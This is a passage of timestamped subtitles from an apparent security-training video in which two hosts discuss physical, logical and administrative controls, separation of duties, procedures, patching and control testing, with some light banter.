00:06:12.715\nwe might have a website that's publicly\nfacing but you don't buy anything from us.\n\n126\n00:06:12.715 --> 00:06:15.955\nIt's strictly just like an information\npage, hey, this is what we do,\n\n127\n00:06:15.955 --> 00:06:16.725\nthis is our company.\n\n128\n00:06:16.725 --> 00:06:18.085\nAre we good?\n\n129\n00:06:18.085 --> 00:06:19.325\nDon't you like us?\n&gt;&gt; Right.\n\n130\n00:06:19.325 --> 00:06:22.265\n&gt;&gt; But there's no real order process\n\n131\n00:06:22.265 --> 00:06:23.075\non there.\n\n132\n00:06:23.075 --> 00:06:25.885\nThere's no company\nsecrets on this website.\n\n133\n00:06:25.885 --> 00:06:31.119\nSo would I spend lots and lots of money\nimplementing controls to protect that\n\n134\n00:06:31.119 --> 00:06:36.462\nwebsite or as you say, more controls\nabout hey, let's put guards out here.\n\n135\n00:06:36.462 --> 00:06:38.135\nLet's put gates around our facility.\n\n136\n00:06:38.135 --> 00:06:42.520\nLet's put cameras up, things like that\n&gt;&gt; Exactly, you got the whole multi-factor\n\n137\n00:06:42.520 --> 00:06:46.260\nauthentications and like Mike said,\nguards, gates, guns, the whole nine yards.\n\n138\n00:06:46.260 --> 00:06:47.430\nI like moats.\n&gt;&gt; Moats?\n\n139\n00:06:47.430 --> 00:06:48.130\n&gt;&gt; I want\n\n140\n00:06:48.130 --> 00:06:48.980\nmoats to make a comeback.\n\n141\n00:06:48.980 --> 00:06:49.670\n&gt;&gt; Sharks?\n&gt;&gt; Yeah.\n\n142\n00:06:49.670 --> 00:06:50.380\n&gt;&gt; With laser beams.\n\n143\n00:06:50.380 --> 00:06:51.412\n&gt;&gt; Alligators, right?\n\n144\n00:06:51.412 --> 00:06:53.360\nGet you some bull sharks in there.\n\n145\n00:06:53.360 --> 00:06:55.656\nPeople are gonna, they're gonna think\ntwice before they try to traverse that\n\n146\n00:06:55.656 --> 00:06:56.361\nthing.\n&gt;&gt; [LAUGH]\n\n147\n00:06:56.361 --> 00:06:59.422\n&gt;&gt; Or so I'm all about the moats.\n\n148\n00:06:59.422 --> 00:07:00.155\n&gt;&gt; I think they're cool.\n\n149\n00:07:00.155 --> 00:07:01.447\nYou don't see them enough anymore.\n&gt;&gt; I know, that's what I'm saying.\n\n150\n00:07:01.447 --> 00:07:02.662\n&gt;&gt; I don't know what the problem is.\n\n151\n00:07:02.662 --> 00:07:03.756\n&gt;&gt; They're primed for a comeback.\n\n152\n00:07:03.756 --> 00:07:05.160\nWe've gotta get a moat somewhere.\n\n153\n00:07:05.160 --> 00:07:09.020\nI wouldn't be surprised if there was\nsome moat-like thing around somewhere.\n\n154\n00:07:09.020 --> 00:07:11.089\n&gt;&gt; Somebody's got one.\n\n155\n00:07:11.089 --> 00:07:13.340\n&gt;&gt; [CROSSTALK].\n\n156\n00:07:13.340 --> 00:07:15.435\n&gt;&gt; All right, let's see here.\n\n157\n00:07:15.435 --> 00:07:17.090\nBut Mike's right.\n\n158\n00:07:17.090 --> 00:07:20.037\nSomething like protecting against\nthe denial service attack against\n\n159\n00:07:20.037 --> 00:07:25.230\nan informational website that has no real\naccess to any other part of our system\n\n160\n00:07:25.230 --> 00:07:31.400\nis not as important as it would be\nscrewing up the physical access\n\n161\n00:07:31.400 --> 00:07:36.380\nto where we hold our prototypes,\nand things of that nature, right?\n\n162\n00:07:36.380 --> 00:07:39.670\nSo let's move on, physical controls,\nwe were just kinda talking about that,\n\n163\n00:07:39.670 --> 00:07:41.820\nthe guards, gates, guns, moats.\n\n164\n00:07:41.820 --> 00:07:44.700\nGet the moat action going on here,\ntwo-factor authentication.\n\n165\n00:07:44.700 --> 00:07:48.751\nRemember our multi-factor authentication\nis more properly, remember when it comes\n\n166\n00:07:48.751 --> 00:07:52.966\nto multi-factor authentication, you've got\nthe things you are, the things you know,\n\n167\n00:07:52.966 --> 00:07:54.558\nthe things you have.\n&gt;&gt; Yeah.\n\n168\n00:07:54.558 --> 00:07:55.584\n&gt;&gt; And then there's also location\n\n169\n00:07:55.584 --> 00:07:56.845\nnow is becoming more and more popular.\n\n170\n00:07:56.845 --> 00:08:00.255\nSo it's not What we have but\n\n171\n00:08:00.255 --> 00:08:04.200\nalso where you are.\n&gt;&gt; Who you are and where you are.\n\n172\n00:08:04.200 --> 00:08:04.700\n&gt;&gt; Who you are,\n\n173\n00:08:04.700 --> 00:08:07.920\nwhere you are and what you are, whole\nnine yards really comes into play here.\n\n174\n00:08:07.920 --> 00:08:12.047\nKeep those ideas in mind,\nmake sure you know the differentiation\n\n175\n00:08:12.047 --> 00:08:15.890\nbetween those different\nfactors of multi-factor, okay?\n\n176\n00:08:17.350 --> 00:08:18.820\nLogical controls as well.\n\n177\n00:08:18.820 --> 00:08:25.770\nThese are our passwords, biometrics,\nfirewall rules, that is a logical control.\n\n178\n00:08:25.770 --> 00:08:32.480\nThings that we have put into place\nas a roadblock for an attacker.\n\n179\n00:08:32.480 --> 00:08:35.050\nSome hoop they've gotta jump through,\n\n180\n00:08:35.050 --> 00:08:39.860\na gate they have to bypass before they\ncan get access to the next thing, right?\n\n181\n00:08:39.860 --> 00:08:43.780\nAnd of course as always,\ndefend some debts, defences away we go.\n\n182\n00:08:43.780 --> 00:08:46.410\nSo if you can recommend all this things,\nright?\n\n183\n00:08:46.410 --> 00:08:49.040\nFile permissions and\nother logical control,\n\n184\n00:08:49.040 --> 00:08:54.560\nit's not a tangible thing but\nit is something that we have done.\n\n185\n00:08:54.560 --> 00:08:57.252\nHopefully, that is getting\ninto your brain, right?\n\n186\n00:08:57.252 --> 00:08:59.526\nThat it is that action of doing,\n\n187\n00:08:59.526 --> 00:09:04.615\nmaybe it is a logical action where\nwe've set up something like that.\n\n188\n00:09:04.615 --> 00:09:08.230\nFile encryption,\nintrusion detection prevention systems.\n\n189\n00:09:08.230 --> 00:09:10.010\nThese are logical controls, okay.\n\n190\n00:09:11.270 --> 00:09:16.160\nAdministrative control, these are actions\nthat people take to strengthen security.\n\n191\n00:09:17.600 --> 00:09:20.790\nThis will be things like creating and\nenforcing procedures.\n\n192\n00:09:20.790 --> 00:09:23.380\nWe're gonna talk about procedures\nin just a moment [COUGH] but\n\n193\n00:09:23.380 --> 00:09:25.633\nright now I'm just gonna go ahead and\nmention them.\n\n194\n00:09:25.633 --> 00:09:30.616\nThese are the things that employees\nare allowed to do, that they can do,\n\n195\n00:09:30.616 --> 00:09:33.325\nthey must do, that they must never do.\n\n196\n00:09:33.325 --> 00:09:36.161\nWe have to define that\nout in the procedures.\n\n197\n00:09:36.161 --> 00:09:38.104\nThat's administrative control.\n\n198\n00:09:38.104 --> 00:09:43.419\nAccount reviews, so\nwhen we're reviewing Mike's account.\n\n199\n00:09:43.419 --> 00:09:45.257\nWell, what's Mike's account been up to?\n\n200\n00:09:45.257 --> 00:09:46.190\nI don't know.\n\n201\n00:09:46.190 --> 00:09:48.382\nMaybe I'm not looking at\nMike specifically but\n\n202\n00:09:48.382 --> 00:09:50.858\nI'm just looking at the logs\ngenerally in accounts.\n\n203\n00:09:50.858 --> 00:09:51.858\nWhat am I seeing there?\n\n204\n00:09:51.858 --> 00:09:53.198\nAm I seeing any there kind of,\n\n205\n00:09:53.198 --> 00:09:56.352\nwhy do I keep seeing all these\nfailures sent to x system?\n\n206\n00:09:56.352 --> 00:09:57.690\nThat's maybe something\nI need to look into,\n\n207\n00:09:57.690 --> 00:09:59.940\nwhy is everybody having\ntrouble getting that system.\n\n208\n00:09:59.940 --> 00:10:01.225\nAnd I go and I survey them, and\n\n209\n00:10:01.225 --> 00:10:04.384\nthey say, no I don't have any\ntrouble at all getting that.\n\n210\n00:10:04.384 --> 00:10:10.959\nWell that seems weird because everybody's\naccount has like 200 access denieds.\n\n211\n00:10:10.959 --> 00:10:11.824\nWhat's going on there?\n\n212\n00:10:11.824 --> 00:10:14.939\nI've never had 200 success denieds.\n\n213\n00:10:14.939 --> 00:10:16.633\nOkay, I need to look further into it.\n\n214\n00:10:16.633 --> 00:10:20.170\nSo there we go, but\nthat's something that I'm doing, right.\n\n215\n00:10:20.170 --> 00:10:24.704\nSo the logical control will be the fact\nthat we're auditing those logins.\n\n216\n00:10:24.704 --> 00:10:27.995\nBut the administrative control\nis the fact that I am,\n\n217\n00:10:27.995 --> 00:10:31.946\nthrough a procedure or a policy\nmandated to look at those logs and\n\n218\n00:10:31.946 --> 00:10:37.430\nbe discerning as an administrator through\nmy experience and my expertise, right?\n\n219\n00:10:37.430 --> 00:10:38.790\nSo that's what's up.\n\n220\n00:10:38.790 --> 00:10:44.014\nBackground checks, hire somebody,\nmake sure they're not a terrorist.\n\n221\n00:10:44.014 --> 00:10:48.711\n[LAUGH] Make sure they're not actively\nlike, I see that you someone got out\n\n222\n00:10:48.711 --> 00:10:52.766\nof prison on a third strike offense,\nhow did that work out?\n\n223\n00:10:52.766 --> 00:10:54.568\nI made a deal and.\n\n224\n00:10:54.568 --> 00:10:56.313\nSo you're back in the game?\n\n225\n00:10:56.313 --> 00:10:57.616\nYeah, what did you do?\n\n226\n00:10:57.616 --> 00:10:58.400\nIt was computer crime.\n\n227\n00:10:58.400 --> 00:10:59.754\nGreat, no, thanks.\n\n228\n00:10:59.754 --> 00:11:02.005\n[LAUGH] That kind of thing.\n\n229\n00:11:02.005 --> 00:11:06.989\nYou wanna do those background checks,\nmake sure that you're not bringing\n\n230\n00:11:06.989 --> 00:11:12.305\nanybody in that you might be inviting\nthe wolf into the sheep's flock, right?\n\n231\n00:11:12.305 --> 00:11:15.320\nSo that's what we wanna avoid.\n\n232\n00:11:15.320 --> 00:11:16.410\nSeparation of duties.\n\n233\n00:11:16.410 --> 00:11:19.559\nI really like this one\nbecause it never gets done.\n\n234\n00:11:19.559 --> 00:11:20.321\n&gt;&gt; Right.\n\n235\n00:11:20.321 --> 00:11:23.094\n&gt;&gt; And it would so help.\n\n236\n00:11:23.094 --> 00:11:28.980\nSo many companies if they just said, all\nright Mike, your job is you're the HR guy.\n\n237\n00:11:28.980 --> 00:11:32.190\nAnd you just do HR, man, and\nyou're just the best HR person.\n\n238\n00:11:32.190 --> 00:11:34.240\nThen Mike never takes a vacation.\n\n239\n00:11:34.240 --> 00:11:36.270\nEven when he's sick he never comes in.\n\n240\n00:11:37.270 --> 00:11:42.800\nBecause in Mike's mind, if he doesn't have\ncontrol of the HR sphere in every way,\n\n241\n00:11:42.800 --> 00:11:46.280\nshape and form, then he's useless and\nthey're gonna fire him.\n\n242\n00:11:46.280 --> 00:11:47.740\nHe's always worried about being fired.\n\n243\n00:11:47.740 --> 00:11:49.280\nThis is typically how I see this worked\n\n244\n00:11:49.280 --> 00:11:49.910\nout\n&gt;&gt; [LAUGH]\n\n245\n00:11:49.910 --> 00:11:50.680\n&gt;&gt; Practically, and\n\n246\n00:11:50.680 --> 00:11:52.070\nthere's multiple ways\nthat this can work out.\n\n247\n00:11:52.070 --> 00:11:55.420\nBut this is how I typically seen it\nworked out in my anecdotal experience.\n\n248\n00:11:56.610 --> 00:11:58.145\nSo Mike never leaves, he never goes away.\n\n249\n00:11:58.145 --> 00:12:01.930\nWell, all the things,\nall the knowledge is now in Mike's head.\n\n250\n00:12:01.930 --> 00:12:05.670\nIf Mike is not here, he's basically\nbecome a part of a procedure.\n\n251\n00:12:06.740 --> 00:12:09.590\nAnd if he's not there,\nthe procedure won't go through, right?\n\n252\n00:12:09.590 --> 00:12:13.700\nThat function no longer functions\nbecause a key player in it is not there.\n\n253\n00:12:13.700 --> 00:12:16.920\nSo Mike gets hit by a bus,\nnow what happens?\n\n254\n00:12:16.920 --> 00:12:21.470\nWe're scrambling to try to fill that gap.\n\n255\n00:12:21.470 --> 00:12:25.296\nMaybe knowledge is lost forever,\nokay, because of my company.\n\n256\n00:12:25.296 --> 00:12:28.200\nSo Mike, don't get hit by busses.\n&gt;&gt; I'll try not to.\n\n257\n00:12:28.200 --> 00:12:29.132\n&gt;&gt; Yes, look both ways, my friend.\n\n258\n00:12:29.132 --> 00:12:29.854\n&gt;&gt; I do look both ways,\n\n259\n00:12:29.854 --> 00:12:30.926\nI'm pretty good about that.\n\n260\n00:12:30.926 --> 00:12:31.745\n[CROSSTALK]\n&gt;&gt; No.\n\n261\n00:12:31.745 --> 00:12:33.177\n&gt;&gt; [LAUGH]\n\n262\n00:12:33.177 --> 00:12:34.714\n&gt;&gt; So following the law.\n\n263\n00:12:34.714 --> 00:12:40.323\nBut the separation of duties,\nif I were to say, I'm gonna hire Mike 2.0.\n\n264\n00:12:40.323 --> 00:12:44.370\nAnd now I'm gonna mandatory say Mike,\nyou have to take vacation.\n\n265\n00:12:46.025 --> 00:12:49.150\nAn you must take,\nno building up a vacation so\n\n266\n00:12:49.150 --> 00:12:52.700\nthat you can hold me hostage with\nvacation or threatening to quit.\n\n267\n00:12:52.700 --> 00:12:56.170\nSo you see the benefit of\nseparating duties out.\n\n268\n00:12:56.170 --> 00:12:58.520\nThere's no one key player.\n\n269\n00:12:58.520 --> 00:13:00.870\nEverybody knows somebody and\nthere's always a backup for\n\n270\n00:13:00.870 --> 00:13:03.240\nthat person,\nI'm separating those duties out.\n\n271\n00:13:03.240 --> 00:13:05.485\nPlus when you start\ntalking about security,\n\n272\n00:13:05.485 --> 00:13:06.340\n&gt;&gt; Mm-hm.\n\n273\n00:13:06.340 --> 00:13:06.960\n&gt;&gt; This is really\n\n274\n00:13:06.960 --> 00:13:08.020\nwhat we're here for, right?\n\n275\n00:13:09.190 --> 00:13:11.960\nIf Mike has all of the information\nabout HR, he holds the key,\n\n276\n00:13:11.960 --> 00:13:16.980\nhe's the grandmaster of HR and again\ncan hold us hostage in a security way.\n\n277\n00:13:16.980 --> 00:13:21.430\nHe knows the ins and outs to the systems\nand could be exfiltrating data, could be\n\n278\n00:13:21.430 --> 00:13:26.580\nfarming out, making extra money on\nthe side using our system, our resources.\n\n279\n00:13:27.610 --> 00:13:28.600\nSo we don't want that.\n\n280\n00:13:28.600 --> 00:13:31.625\nWe wanna avoid that,\nwe separate these duties out,\n\n281\n00:13:31.625 --> 00:13:36.094\nthen that's less likely to happen because\nnow he's got to get Bob over here,\n\n282\n00:13:36.094 --> 00:13:40.424\nwho's just as influential in the system\nas he is and knows all the duties and\n\n283\n00:13:40.424 --> 00:13:44.378\nsees where everything goes,\nwill be able to track that stuff down.\n\n284\n00:13:44.378 --> 00:13:45.129\nWe see the movies all the time.\n\n285\n00:13:45.129 --> 00:13:47.330\nBut I was looking at the papers here,\nand this doesn't add up.\n\n286\n00:13:47.330 --> 00:13:49.466\nAnd the guy pulls out a gun,\nand he kills him.\n\n287\n00:13:49.466 --> 00:13:53.985\nHe strangles him to death, hides the body\nand runs to Barbados or whatever, right?\n\n288\n00:13:53.985 --> 00:13:55.983\nWe wanna avoid those situation,\ncuz that's bad.\n\n289\n00:13:55.983 --> 00:13:58.810\nAnd especially when it comes\nto our security systems,\n\n290\n00:13:58.810 --> 00:14:02.559\nwe don't want any person with the golden\nkey, the only person that knows\n\n291\n00:14:02.559 --> 00:14:06.687\nall the stuff, cuz they could use that as\ninside knowledge and be a threat to us.\n\n292\n00:14:06.687 --> 00:14:10.646\nSo just to the separation,\nI'm not saying anybody would do that but\n\n293\n00:14:10.646 --> 00:14:15.518\nit removes the ability for them to do that\nby just separating those things, right?\n\n294\n00:14:15.518 --> 00:14:19.008\nAnd then again, reviewing system logs,\nit's probably a good idea.\n\n295\n00:14:19.008 --> 00:14:23.400\n[LAUGH] If you never noticed,\nthey've harped on that quite a lot.\n\n296\n00:14:23.400 --> 00:14:26.470\nSo you need to be looking at your logs.\n\n297\n00:14:26.470 --> 00:14:27.540\nAll right, let's move into procedures,\n\n298\n00:14:27.540 --> 00:14:28.370\nMike.\n&gt;&gt; Okay.\n\n299\n00:14:28.370 --> 00:14:29.833\n&gt;&gt; These are the step by step\n\n300\n00:14:29.833 --> 00:14:34.369\nchecklists that we do that might be\ndictated by a policy that we've created.\n\n301\n00:14:34.369 --> 00:14:36.728\nWe're enforcing through a controller\nof some point that, well,\n\n302\n00:14:36.728 --> 00:14:37.916\nhow is that controller working?\n\n303\n00:14:37.916 --> 00:14:42.480\nWell, I've got my procedure for\ndoing that control right here, right?\n\n304\n00:14:42.480 --> 00:14:47.550\nThis is when it really boils down\nto the idea of your checklists.\n\n305\n00:14:47.550 --> 00:14:51.420\nAll right, step one, do this, step two,\n\n306\n00:14:51.420 --> 00:14:53.990\nyou should be seeing\nthe output of that is this.\n\n307\n00:14:53.990 --> 00:14:57.287\nIf you do then, this is step two,\nif not go back to step one and\n\n308\n00:14:57.287 --> 00:15:00.144\nmake a modification,\nverify whatever the case is.\n\n309\n00:15:00.144 --> 00:15:04.802\nI have had to write this\nthings quite a bit.\n\n310\n00:15:04.802 --> 00:15:07.243\nThey are never fun,\nthey are time consuming.\n\n311\n00:15:07.243 --> 00:15:08.849\nYou just do it.\n\n312\n00:15:08.849 --> 00:15:13.129\nYou know what to do, you just do\nthe thing, but not everybody knows that.\n\n313\n00:15:13.129 --> 00:15:17.140\nNot everybody is as familiar with\nthings as maybe you are or I am.\n\n314\n00:15:17.140 --> 00:15:19.760\nSo we need to be able to say,\nyou know what, Mike?\n\n315\n00:15:19.760 --> 00:15:23.270\nYou're not tier 3 tech support,\nyou're tier 1 tech support.\n\n316\n00:15:23.270 --> 00:15:23.930\nBut every now and then,\n\n317\n00:15:23.930 --> 00:15:27.515\nit'd be nice to have you be able to\nhandle this without bringing it to me.\n\n318\n00:15:27.515 --> 00:15:29.762\nSo I'm gonna procedure, give it to Mike.\n\n319\n00:15:29.762 --> 00:15:34.320\nMike is then able to follow set procedure,\nand again,\n\n320\n00:15:34.320 --> 00:15:38.160\nI will have compliance in mind,\nI will have our company policies in mind,\n\n321\n00:15:38.160 --> 00:15:44.150\nour regulatory principles behind in\nmind when I'm creating these procedures.\n\n322\n00:15:44.150 --> 00:15:47.642\nSo I just keep that in mind, right?\n&gt;&gt; Yeah, I always look at procedures.\n\n323\n00:15:47.642 --> 00:15:49.740\nI like the example of an end user.\n\n324\n00:15:49.740 --> 00:15:50.260\nWe tell them, hey,\n\n325\n00:15:50.260 --> 00:15:53.640\nyou've gotta change your password\nevery 30 days, every 60 days.\n\n326\n00:15:53.640 --> 00:15:54.336\nOkay, great we've told them.\n\n327\n00:15:54.336 --> 00:15:56.434\nThat's our policy,\nyou must change your password,\n\n328\n00:15:56.434 --> 00:15:59.326\nthe system's probably gonna remind\nyou if we've put the proper controls\n\n329\n00:15:59.326 --> 00:16:00.243\nin place.\n&gt;&gt; Yeah.\n\n330\n00:16:00.243 --> 00:16:02.643\n&gt;&gt; But, How do I?\n\n331\n00:16:02.643 --> 00:16:06.695\nI remember how to do it on\nWindows Vista or something like that.\n\n332\n00:16:06.695 --> 00:16:07.970\n[LAUGH].\nHow do I do it on Windows 10, right?\n\n333\n00:16:07.970 --> 00:16:12.699\nThose procedures are how the policies\nget implemented and like you said,\n\n334\n00:16:12.699 --> 00:16:16.674\nyou can't assume that your users\nknow how to do these things.\n\n335\n00:16:16.674 --> 00:16:18.461\nJust because you tell them to do it,\n\n336\n00:16:18.461 --> 00:16:21.107\ntell them how to do it.\n&gt;&gt; I actually have a prime example of\n\n337\n00:16:21.107 --> 00:16:24.260\nwhere a procedure would've been\nreally good for this show.\n\n338\n00:16:24.260 --> 00:16:27.752\nI forgot to show you a PDF that I wanted\nto show you back when we were talking\n\n339\n00:16:27.752 --> 00:16:29.111\nabout controls.\n&gt;&gt; Yeah.\n\n340\n00:16:29.111 --> 00:16:30.872\n&gt;&gt; If I had a procedure in place that\n\n341\n00:16:30.872 --> 00:16:34.327\nsaid, step five, show PDF,\nI kinda threw it on the end as me and\n\n342\n00:16:34.327 --> 00:16:37.411\nMike were trying to look for\ncool stuff to show you guys.\n\n343\n00:16:37.411 --> 00:16:41.212\nWhich is the CIS critical control matrix,\nvery cool stuff.\n\n344\n00:16:41.212 --> 00:16:43.992\nLet me bring it up,\nI've gotta zoomed in really,\n\n345\n00:16:43.992 --> 00:16:47.780\nreally large because the text they use for\nthis thing is super tiny.\n\n346\n00:16:47.780 --> 00:16:50.682\nBut we'll kind of move around,\njust wanna go back and let you guys know,\n\n347\n00:16:50.682 --> 00:16:52.551\nI'll have the links to\nthis in the show notes.\n\n348\n00:16:52.551 --> 00:16:56.315\nBut it has a lot of great\ninformation throughout here.\n\n349\n00:16:56.315 --> 00:17:01.773\nThis little matrix they give you, giving\nyou basically all the key rundowns for\n\n350\n00:17:01.773 --> 00:17:04.953\nworking with controls\nin your organization,\n\n351\n00:17:04.953 --> 00:17:08.090\nreally informative piece of literature.\n\n352\n00:17:08.090 --> 00:17:10.588\nSo definitely check that out\nwhen you get some chance and\n\n353\n00:17:10.588 --> 00:17:12.460\nwhen you scroll down you get this matrix.\n\n354\n00:17:12.460 --> 00:17:15.100\nAnd it shows you critical control and\n\n355\n00:17:15.100 --> 00:17:18.590\nthen how it maps to the different\nframeworks that you might be working with,\n\n356\n00:17:18.590 --> 00:17:21.090\nand standards.\n&gt;&gt; Make sure you're compliant.\n\n357\n00:17:21.090 --> 00:17:21.840\n&gt;&gt; Exactly.\n\n358\n00:17:21.840 --> 00:17:24.550\nSo I wanted to make sure you\nguys were able to see that.\n\n359\n00:17:24.550 --> 00:17:28.190\nAnd again, if I had had a procedure in\nplace that said, if last minute changes,\n\n360\n00:17:28.190 --> 00:17:31.630\nthen make sure to append notes to include,\nright?\n\n361\n00:17:31.630 --> 00:17:34.096\nSo this would've been a checklist\nthat I would've needed to follow.\n\n362\n00:17:34.096 --> 00:17:37.280\nIf that procedure were in place,\nI wouldn't have made that mistake,\n\n363\n00:17:37.280 --> 00:17:40.060\nwe wouldn't have been backtracking to\nshow you critical control stuff, or\n\n364\n00:17:40.060 --> 00:17:42.070\nin the procedures portion of our show.\n\n365\n00:17:42.070 --> 00:17:43.010\nAnd there you go.\n\n366\n00:17:43.010 --> 00:17:44.320\nSo, a really important part.\n\n367\n00:17:44.320 --> 00:17:47.790\nAll right, let's keep moving though.\n\n368\n00:17:47.790 --> 00:17:51.720\nTypically, procedures are mandatory\nadherence, stuff that you must do,\n\n369\n00:17:51.720 --> 00:17:53.110\nyou must follow.\n\n370\n00:17:53.110 --> 00:17:57.600\nIf you wanna get outside of that you're\ngonna need some sort of authorization and\n\n371\n00:17:57.600 --> 00:18:02.160\ngood reason to go around the standardized\nprocedure, so just keep that in mind.\n\n372\n00:18:04.280 --> 00:18:07.320\nProcedures will be like things\nlike continuous monitoring.\n\n373\n00:18:07.320 --> 00:18:09.935\nAgain, there is that monitoring word\nagain, we need to be monitoring things.\n\n374\n00:18:09.935 --> 00:18:15.940\nHow the monitoring will be executed and\nwhat technologies will be used, right?\n\n375\n00:18:15.940 --> 00:18:20.330\nSo making that list,\nhere is how we need to be doing that.\n\n376\n00:18:20.330 --> 00:18:22.192\nEvidence production.\n\n377\n00:18:22.192 --> 00:18:27.240\nWhat if an incident has occurred and\nI need to get evidence together for\n\n378\n00:18:27.240 --> 00:18:32.030\nlegal or we've been subpoenaed or\nsomething like that has happened.\n\n379\n00:18:32.030 --> 00:18:35.090\nSo how do we deal with being subpoenaed?\n\n380\n00:18:35.090 --> 00:18:37.530\nWhat's the chain of command\nwhen it comes to that?\n\n381\n00:18:37.530 --> 00:18:41.790\nHow do we perform,\nhow do we keep records of that?\n\n382\n00:18:42.920 --> 00:18:45.950\nFollowing the chain of custody,\nmake sure that's happening.\n\n383\n00:18:45.950 --> 00:18:49.300\nAll those things done,\nif you make a procedure for that, and\n\n384\n00:18:49.300 --> 00:18:52.320\nit kinda goes back to those ideas,\nthe playbooks that we have on our show.\n\n385\n00:18:52.320 --> 00:18:55.400\nThere will be procedures\ninside of those playbooks.\n\n386\n00:18:55.400 --> 00:18:58.031\nSo, you're starting to see the importance,\n\n387\n00:18:58.031 --> 00:19:01.210\nhow everything starts to\nkinda link together, right?\n\n388\n00:19:01.210 --> 00:19:05.240\nPatching, how is patching meant to be?\n\n389\n00:19:05.240 --> 00:19:08.240\nI've had to deal with this,\nI was the guy who did the patching for\n\n390\n00:19:08.240 --> 00:19:11.510\nour organization for awhile.\n&gt;&gt; Good times, right?\n\n391\n00:19:11.510 --> 00:19:12.710\n&gt;&gt; Yeah, great times.\n\n392\n00:19:12.710 --> 00:19:15.980\nShould we release critical and\n\n393\n00:19:15.980 --> 00:19:19.260\nsecurity patches as they roll out,\nlike immediately?\n\n394\n00:19:19.260 --> 00:19:21.030\nShould we send them to testing?\n\n395\n00:19:21.030 --> 00:19:21.950\nShould reboots occur?\n\n396\n00:19:21.950 --> 00:19:22.510\nShould we wait?\n\n397\n00:19:22.510 --> 00:19:23.280\nShould we do this, do that?\n\n398\n00:19:23.280 --> 00:19:26.920\nI had to figure all that stuff out, make a\npolicy that says that's how we do it, and\n\n399\n00:19:26.920 --> 00:19:31.660\nthen write a procedure for doing that\nthat I could follow every single time.\n\n400\n00:19:31.660 --> 00:19:34.070\nSo that A, I don't forget to do anything.\n\n401\n00:19:34.070 --> 00:19:36.440\nThat's a big portion of\nwhy we do procedures.\n\n402\n00:19:36.440 --> 00:19:40.800\nAnd B, that it is done correctly,\nthe things that I do engage in.\n\n403\n00:19:40.800 --> 00:19:42.698\n&gt;&gt; Yeah, absolutely, very important,\n\n404\n00:19:42.698 --> 00:19:45.924\nbecause let's say I'm Jo, IT guy or\ngal, I remote into a server.\n\n405\n00:19:45.924 --> 00:19:48.902\nI get a notification down there, it says,\nhey, there's an update available for\n\n406\n00:19:48.902 --> 00:19:49.428\nyour server.\n\n407\n00:19:49.428 --> 00:19:52.879\nWell, I know that our policy says we\nneed to keep our servers up to date, so\n\n408\n00:19:52.879 --> 00:19:56.051\ndo I just click on that thought bubble or\nthat little popup bubble and\n\n409\n00:19:56.051 --> 00:19:58.400\nupdate the server in\nthe middle of the day?\n\n410\n00:19:58.400 --> 00:20:00.960\nOr do we have a procedure\nin place that says, hey,\n\n411\n00:20:00.960 --> 00:20:02.850\nthis is who we notify that\nthere are updates available.\n\n412\n00:20:02.850 --> 00:20:05.370\nWe need to make sure that nobody's\nconnected to the machine or\n\n413\n00:20:05.370 --> 00:20:08.420\nwhatever your organization\nneeds to implement.\n\n414\n00:20:08.420 --> 00:20:13.430\nBut having that procedure in place\nis going to prevent somebody\n\n415\n00:20:13.430 --> 00:20:17.890\nfrom randomly rebooting a machine in the\nmiddle of the day or something like that.\n\n416\n00:20:17.890 --> 00:20:19.130\n&gt;&gt; I love the confidence.\n\n417\n00:20:19.130 --> 00:20:21.170\nDone it, done it, my bad, sorry.\n\n418\n00:20:21.170 --> 00:20:24.910\nDidn't follow procedure,\ndid something wrong, right?\n\n419\n00:20:24.910 --> 00:20:28.440\nDidn't see in the procedure\nthat I was making a mistake\n\n420\n00:20:28.440 --> 00:20:30.210\nbecause there wasn't a procedure.\n\n421\n00:20:30.210 --> 00:20:32.540\nSomeone just said,\nhey go do this, and I did it.\n\n422\n00:20:32.540 --> 00:20:35.880\nIf there was a procedure in place\nthat could've been avoided, right?\n\n423\n00:20:35.880 --> 00:20:38.305\nAnd then there would've\nbeen a lot less outcry.\n\n424\n00:20:38.305 --> 00:20:38.880\n&gt;&gt; [LAUGH]\n\n425\n00:20:38.880 --> 00:20:41.971\n&gt;&gt; Let's talk about control testing\n\n426\n00:20:41.971 --> 00:20:44.580\nprocedures, right?\n\n427\n00:20:44.580 --> 00:20:49.409\nI say that, it's just basically-\n&gt;&gt; Is the control doing\n\n428\n00:20:49.409 --> 00:20:51.413\nwhat we intended for it to do?\n&gt;&gt; Yes, thank you,\n\n429\n00:20:51.413 --> 00:20:52.790\nthat's exactly the words\nI was about to say.\n\n430\n00:20:52.790 --> 00:20:55.200\nIs it doing what we intended?\n&gt;&gt; Here's a great example.\n\n431\n00:20:55.200 --> 00:20:56.690\nYou go out and you buy a bunch of cameras,\n\n432\n00:20:56.690 --> 00:20:59.250\nyou're gonna put this\nsurveillance on your building.\n\n433\n00:20:59.250 --> 00:21:01.650\nYou get somebody to mount\nthem up outside for you.\n\n434\n00:21:01.650 --> 00:21:04.580\nEverything's great,\nyou don't ever test it.\n\n435\n00:21:04.580 --> 00:21:07.010\nAnd you come to find out that the one\ncamera out there back that's supposed to\n\n436\n00:21:07.010 --> 00:21:10.060\nbe pointed at the loading dock is\nactually pointed at the brick wall.\n\n437\n00:21:10.060 --> 00:21:12.295\nAnd you've got a nice close-up of\nthe bricks and the ants going across.\n\n438\n00:21:13.325 --> 00:21:16.303\nNot doing you good.\n&gt;&gt; Maybe one of your guards is a known\n\n439\n00:21:16.303 --> 00:21:19.847\nornithologist, pointing\nit at the birds' nest.\n\n440\n00:21:19.847 --> 00:21:20.548\n&gt;&gt; [CROSSTALK] But\n\n441\n00:21:20.548 --> 00:21:24.406\nif you don't ever test these kind of\nthings, you put firewall rules into place\n\n442\n00:21:24.406 --> 00:21:26.754\nto prevent people from\ngoing to certain sites.\n\n443\n00:21:26.754 --> 00:21:28.231\nIs your rule working or\n\n444\n00:21:28.231 --> 00:21:30.855\ndid I get them in the wrong order?\n&gt;&gt; How do I know that?\n\n445\n00:21:30.855 --> 00:21:31.935\n&gt;&gt; And people are still going\n\n446\n00:21:31.935 --> 00:21:33.615\nto that site.\n&gt;&gt; Right, I go to the site,\n\n447\n00:21:33.615 --> 00:21:35.270\ncan I make it to the site?\n\n448\n00:21:35.270 --> 00:21:36.743\nIf I can I know there's\nsomething wrong with my rule.\n\n449\n00:21:36.743 --> 00:21:41.503\nYou've gotta be testing these things out\nand verify that they are doing what it is\n\n450\n00:21:41.503 --> 00:21:46.194\nyou think they should be doing and that\nthe procedure has dictated that it should\n\n451\n00:21:46.194 --> 00:21:46.930\nbe doing.\n&gt;&gt; 